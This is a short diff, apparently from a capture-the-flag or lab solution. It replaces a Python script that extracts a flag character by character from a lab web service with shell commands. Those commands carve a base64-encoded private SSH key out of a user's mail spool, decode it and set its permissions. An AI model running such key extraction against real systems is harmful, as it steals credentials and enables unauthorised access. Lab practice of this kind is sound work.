@@ -1,22 +1,10 @@
-#!/usr/bin/python3
-import requests
+cd /home/apprentice
 
-flag = ''
-index = 0
+sed -n '/filename="id_rsa"/,/^--/p' /var/mail/apprentice \
+| sed '1,/^$/d;/^--/,$d' \
+| tr -d '\r' > id_rsa.b64
 
-while True:
-    r = requests.post(f'http://192.168.56.68:8080/bijection?index={index}')
-    char = r.text.strip()
-    
-    if len(char) != 1:
-        print(f"Bad response: {char[:50]}")
-        break
-    
-    flag += char
-    print(f"[{index}] {char} -> {flag}")
-    
-    if char == '}':
-        break
-    index += 1
+base64 -d id_rsa.b64 > id_rsa
+chmod 600 id_rsa
 
-print(f"\nFull flag: {flag}")
+head -n 1 id_rsa
